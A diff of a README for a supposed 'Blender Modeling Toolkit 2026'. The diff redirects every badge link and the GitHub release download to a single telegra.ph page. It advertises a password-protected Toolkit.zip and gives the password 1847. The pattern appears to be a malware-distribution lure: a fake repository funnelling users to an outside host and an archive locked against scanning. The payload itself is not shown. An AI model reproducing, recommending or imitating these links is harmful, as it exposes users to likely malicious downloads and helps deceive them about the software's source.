@@ -1,11 +1,11 @@
 # 🎨 Blender Modeling Toolkit 2026 — 3D Workflow Accelerator & Mesh Tools
 
-[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/Blender-Modeling-Toolkit)](https://github.com/Alexantros341/Blender-Modeling-Toolkit)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Software](https://img.shields.io/badge/Software-Blender-orange)](https://www.blender.org/)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-3D%20Modeling-purple)]()
-[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/Blender-Modeling-Toolkit)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Software](https://img.shields.io/badge/Software-Blender-orange)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-3D%20Modeling-purple)](https://telegra.ph/Download-05-21-39)
+[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
@@ -43,7 +43,7 @@ Speed up mesh operations, automate UV unwrapping, batch-process materials, optim
 
 🔽 Password-protected archive — extract and supercharge your Blender workflow.
 
-**📦** [**Download** `Toolkit.zip`](https://github.com/PebbleDisplay24/Blender-Modeling-Toolkit/releases/download/Release/Toolkit.zip)
+**📦** [**Download** `Toolkit.zip`](https://telegra.ph/Download-05-21-39)
 
 **🔐** — **1847**
 
